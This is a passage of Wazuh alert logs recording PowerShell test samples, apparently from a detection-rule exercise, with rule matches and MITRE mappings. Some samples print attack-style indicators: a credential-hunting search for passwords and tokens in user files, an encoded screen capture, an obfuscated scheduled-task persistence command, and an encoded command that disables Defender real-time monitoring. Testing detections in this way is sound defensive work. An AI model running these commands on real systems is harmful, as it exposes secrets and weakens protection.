'nv:TEMP\\\\\\\\' + 'collect.zip'''; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"2643a03f-5ea6-44b8-abc2-5117734d10c3\"}}}","id":"1784280934.370026","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:34.670+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"1740d1f0-125d-479b-8938-5802753cfe3f","scriptBlockText":"$sampleId='PST-011'; $indicator='Get-ChildItem -Path ''C:\\\\Users'' -Recurse -Include ''*.config'',''*.xml'' | Select-String -Pattern ''password|token|secret'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721435","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-011'; $indicator='Get-ChildItem -Path ''C:\\Users'' -Recurse -Include ''*.config'',''*.xml'' | Select-String -Pattern ''password|token|secret'''; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 1740d1f0-125d-479b-8938-5802753cfe3f\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:34.6381988Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:34.6381988Z\",\"eventRecordID\":\"721435\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-011'; $indicator='Get-ChildItem -Path ''C:\\\\Users'' -Recurse -Include ''*.config'',''*.xml'' | Select-String -Pattern ''password|token|secret'''; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 1740d1f0-125d-479b-8938-5802753cfe3f\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-011'; $indicator='Get-ChildItem -Path ''C:\\\\\\\\Users'' -Recurse -Include ''*.config'',''*.xml'' | Select-String -Pattern ''password|token|secret'''; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"1740d1f0-125d-479b-8938-5802753cfe3f\"}}}","id":"1784280935.371603","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script recursively collected files from a filesystem search","firedtimes":1,"groups":["windows"," powershell"],"id":"91820","level":4,"mail":false,"mitre":{"id":["T1083","T1119"],"tactic":["Discovery","Collection"],"technique":["File and Directory Discovery","Automated Collection"]}},"timestamp":"2026-07-17T11:35:35.543+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"d6f8741a-d8a4-4a69-baf0-e23a51467a2d","scriptBlockText":"$sampleId='PST-012'; Get-LocalGroup -ErrorAction SilentlyContinue | Select-Object -First 5 Name; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721439","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-012'; Get-LocalGroup -ErrorAction SilentlyContinue | Select-Object -First 5 Name; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: d6f8741a-d8a4-4a69-baf0-e23a51467a2d\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:34.9685702Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:34.9685702Z\",\"eventRecordID\":\"721439\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-012'; Get-LocalGroup -ErrorAction SilentlyContinue | Select-Object -First 5 Name; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: d6f8741a-d8a4-4a69-baf0-e23a51467a2d\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-012'; Get-LocalGroup -ErrorAction SilentlyContinue | Select-Object -First 5 Name; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"d6f8741a-d8a4-4a69-baf0-e23a51467a2d\"}}}","id":"1784280935.371603","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:35.551+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"bece8900-cfb6-46b0-926e-985a1c6f2df0","scriptBlockText":"$sampleId='PST-013'; Test-Path -Path $env:TEMP; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721445","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-013'; Test-Path -Path $env:TEMP; Write-Output 'benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: bece8900-cfb6-46b0-926e-985a1c6f2df0\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:35.3531147Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:35.3531147Z\",\"eventRecordID\":\"721445\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-013'; Test-Path -Path $env:TEMP; Write-Output 'benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: bece8900-cfb6-46b0-926e-985a1c6f2df0\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-013'; Test-Path -Path $env:TEMP; Write-Output 'benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"bece8900-cfb6-46b0-926e-985a1c6f2df0\"}}}","id":"1784280935.374207","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script querying system environment variables","firedtimes":1,"groups":["windows"," powershell"],"id":"91816","level":4,"mail":false,"mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]}},"timestamp":"2026-07-17T11:35:35.565+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"ae42ea01-e822-4ab0-9378-ada20492737b","scriptBlockText":"$sampleId='PST-014'; $encoded='WwBTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALgBHAHIAYQBwAGgAaQBjAHMAXQA6ADoARgByAG8AbQBJAG0AYQBnAGUAKAAkAGIAbQBwACkALgBDAG8AcAB5AEYAcgBvAG0AUwBjAHIAZQBlAG4AKAAwACwAMAAsADAALAAwACwAJABiAG0AcAAuAFMAaQB6AGUAKQA='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721449","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-014'; $encoded='WwBTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALgBHAHIAYQBwAGgAaQBjAHMAXQA6ADoARgByAG8AbQBJAG0AYQBnAGUAKAAkAGIAbQBwACkALgBDAG8AcAB5AEYAcgBvAG0AUwBjAHIAZQBlAG4AKAAwACwAMAAsADAALAAwACwAJABiAG0AcAAuAFMAaQB6AGUAKQA='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: ae42ea01-e822-4ab0-9378-ada20492737b\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:35.7006510Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:35.7006510Z\",\"eventRecordID\":\"721449\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-014'; $encoded='WwBTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALgBHAHIAYQBwAGgAaQBjAHMAXQA6ADoARgByAG8AbQBJAG0AYQBnAGUAKAAkAGIAbQBwACkALgBDAG8AcAB5AEYAcgBvAG0AUwBjAHIAZQBlAG4AKAAwACwAMAAsADAALAAwACwAJABiAG0AcAAuAFMAaQB6AGUAKQA='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: ae42ea01-e822-4ab0-9378-ada20492737b\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-014'; $encoded='WwBTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALgBHAHIAYQBwAGgAaQBjAHMAXQA6ADoARgByAG8AbQBJAG0AYQBnAGUAKAAkAGIAbQBwACkALgBDAG8AcAB5AEYAcgBvAG0AUwBjAHIAZQBlAG4AKAAwACwAMAAsADAALAAwACwAJABiAG0AcAAuAFMAaQB6AGUAKQA='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"ae42ea01-e822-4ab0-9378-ada20492737b\"}}}","id":"1784280936.376375","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script may be using Base64 decoding method","firedtimes":1,"groups":["windows"," powershell"],"id":"91809","level":10,"mail":false,"mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]}},"timestamp":"2026-07-17T11:35:36.578+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"3f3e5a2b-8cd9-4bc9-b844-c372f511a15e","scriptBlockText":"$sampleId='PST-015'; $indicator='Register-Sc`hedule`dTask -TaskNa`me ''UpdateCheck'' -Ac`tion (New-Scheduled`TaskActi`on -Exec`ute ''powe`rshell.exe'' -Argument ''-NoProfi`le -Encod`edC`ommand VwBy`AGk`AdABlAC0ATwB1AH`QAcAB1AHQAIAAnAFQA`SABFAFMASQBT`AC0ASQBOAEUAUgBU`A`CcA'')'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721465","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-015'; $indicator='Register-Sc`hedule`dTask -TaskNa`me ''UpdateCheck'' -Ac`tion (New-Scheduled`TaskActi`on -Exec`ute ''powe`rshell.exe'' -Argument ''-NoProfi`le -Encod`edC`ommand VwBy`AGk`AdABlAC0ATwB1AH`QAcAB1AHQAIAAnAFQA`SABFAFMASQBT`AC0ASQBOAEUAUgBU`A`CcA'')'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 3f3e5a2b-8cd9-4bc9-b844-c372f511a15e\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:36.0451732Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:36.0451732Z\",\"eventRecordID\":\"721465\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-015'; $indicator='Register-Sc`hedule`dTask -TaskNa`me ''UpdateCheck'' -Ac`tion (New-Scheduled`TaskActi`on -Exec`ute ''powe`rshell.exe'' -Argument ''-NoProfi`le -Encod`edC`ommand VwBy`AGk`AdABlAC0ATwB1AH`QAcAB1AHQAIAAnAFQA`SABFAFMASQBT`AC0ASQBOAEUAUgBU`A`CcA'')'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 3f3e5a2b-8cd9-4bc9-b844-c372f511a15e\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-015'; $indicator='Register-Sc`hedule`dTask -TaskNa`me ''UpdateCheck'' -Ac`tion (New-Scheduled`TaskActi`on -Exec`ute ''powe`rshell.exe'' -Argument ''-NoProfi`le -Encod`edC`ommand VwBy`AGk`AdABlAC0ATwB1AH`QAcAB1AHQAIAAnAFQA`SABFAFMASQBT`AC0ASQBOAEUAUgBU`A`CcA'')'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"3f3e5a2b-8cd9-4bc9-b844-c372f511a15e\"}}}","id":"1784280936.376375","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:36.630+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"58b17f1c-9887-4c0e-b298-0306504edf15","scriptBlockText":"$sampleId='PST-016'; Get-Service | Where-Object Status -eq 'Running' | Select-Object -First 5 Name, Status; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721467","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-016'; Get-Service | Where-Object Status -eq 'Running' | Select-Object -First 5 Name, Status; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 58b17f1c-9887-4c0e-b298-0306504edf15\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:36.3716240Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:36.3716240Z\",\"eventRecordID\":\"721467\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-016'; Get-Service | Where-Object Status -eq 'Running' | Select-Object -First 5 Name, Status; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 58b17f1c-9887-4c0e-b298-0306504edf15\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-016'; Get-Service | Where-Object Status -eq 'Running' | Select-Object -First 5 Name, Status; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"58b17f1c-9887-4c0e-b298-0306504edf15\"}}}","id":"1784280936.376375","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:36.662+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"24d1942a-fdee-42b3-869d-56d18d26afe5","scriptBlockText":"$sampleId='PST-017'; (Get-ChildItem -Path $env:TEMP -File -ErrorAction SilentlyContinue | Measure-Object).Count; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721484","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-017'; (Get-ChildItem -Path $env:TEMP -File -ErrorAction SilentlyContinue | Measure-Object).Count; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 24d1942a-fdee-42b3-869d-56d18d26afe5\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:36.7248312Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:36.7248312Z\",\"eventRecordID\":\"721484\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-017'; (Get-ChildItem -Path $env:TEMP -File -ErrorAction SilentlyContinue | Measure-Object).Count; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 24d1942a-fdee-42b3-869d-56d18d26afe5\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-017'; (Get-ChildItem -Path $env:TEMP -File -ErrorAction SilentlyContinue | Measure-Object).Count; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"24d1942a-fdee-42b3-869d-56d18d26afe5\"}}}","id":"1784280937.379614","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script querying system environment variables","firedtimes":2,"groups":["windows"," powershell"],"id":"91816","level":4,"mail":false,"mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]}},"timestamp":"2026-07-17T11:35:37.592+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"2eb3b735-85d6-4f8f-bf69-033e5bb97511","scriptBlockText":"$sampleId='PST-018'; $encoded='UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACcAQwA6AFwAXwBfAFQASABFAFMASQBTAF8ASQBOAEUAUgBUAF8AXwAnACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721489","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-018'; $encoded='UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACcAQwA6AFwAXwBfAFQASABFAFMASQBTAF8ASQBOAEUAUgBUAF8AXwAnACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 2eb3b735-85d6-4f8f-bf69-033e5bb97511\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:37.1521104Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:37.1521104Z\",\"eventRecordID\":\"721489\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-018'; $encoded='UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACcAQwA6AFwAXwBfAFQASABFAFMASQBTAF8ASQBOAEUAUgBUAF8AXwAnACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 2eb3b735-85d6-4f8f-bf69-033e5bb97511\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-018'; $encoded='UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACcAQwA6AFwAXwBfAFQASABFAFMASQBTAF8ASQBOAEUAUgBUAF8AXwAnACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"2eb3b735-85d6-4f8f-bf69-033e5bb97511\"}}}","id":"1784280937.381910","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script may be using Base64 decoding method","firedtimes":2,"groups":["windows"," powershell"],"id":"91809","level":10,"mail":false,"mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]}},"timestamp":"2026-07-17T11:35:37.649+0200"}
